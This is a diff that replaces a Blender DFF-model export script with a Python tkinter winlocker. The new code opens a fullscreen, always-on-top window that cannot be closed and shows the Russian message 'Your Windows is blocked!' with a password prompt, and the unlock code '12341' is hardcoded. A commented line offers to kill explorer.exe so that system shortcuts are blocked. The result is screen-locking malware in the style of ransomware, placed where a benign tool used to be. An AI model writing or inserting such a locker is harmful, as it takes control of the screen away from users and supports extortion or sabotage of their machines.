@@ -1,39 +1,41 @@
-import bpy
+from tkinter import *
+from subprocess import Popen as cmd
 import sys
 
-def main():
-    args = sys.argv
+NameFile = sys.argv[0]
 
-    try:
-        args = args[args.index("--") + 1:]
-    except ValueError:
-        args = []
-
-    if len(args) < 3:
-        print('Use: blender -b -P plugin.py -P script.py -- [path_to_dff] [path_to_output] [mode]')
-        exit(1)
-
-    [dff, output, mode] = args
-    available_modes = dir(bpy.ops.export_scene)
-
-    if mode not in available_modes:
-        print('Available modes:', available_modes)
-        exit(1)
-
-    # Select all objects
-    for obj in bpy.context.scene.objects:
-        obj.select = True
-
-    # Delete selected objects
-    bpy.ops.object.delete()
-
-    # Import dff object
-    bpy.ops.import_rw.dff(
-        'EXEC_DEFAULT', filepath=dff)
-
-    # Export scene.
-    getattr(bpy.ops.export_scene, mode)(filepath=output, path_mode = 'STRIP')
+root = Tk()
 
 
-if __name__ == '__main__':
-    main()
+def CheckPassword(arg):
+    if password.get() == "12341":
+        root.destroy()
+        cmd("start explorer.exe", shell=True)
+        # Универсальный вариант!
+        try:
+            quit()
+        except:
+            cmd(f"taskkill /f /in {NameFile}", shell=True)
+        #                                     #
+
+
+X = root.winfo_screenwidth()
+Y = root.winfo_screenheight()
+
+# cmd("taskkill /f /in explorer.exe", shell=True) # Раскомментировать если хотите запретить доступ к комбинациям "Win+*"
+
+
+bg = "black"
+root["bg"] = bg
+font = "Arial 25 bold"
+root.protocol("WM_DELETE_WINDOW", lambda arg: ...)  # То же самое что Quit только упрощенно
+root.attributes("-topmost", 1)
+root.geometry(f"{X}x{Y}")
+root.overrideredirect(1)
+Label(text="Ваш Windows заблокирован!", fg="red", bg=bg, font=font).pack()
+Label(text="\n\n\n\nВведите пароль", fg="white", bg=bg, font=font).pack()
+
+password = Entry(font=font)
+password.pack()
+password.bind("<Return>", CheckPassword)
+root.mainloop()
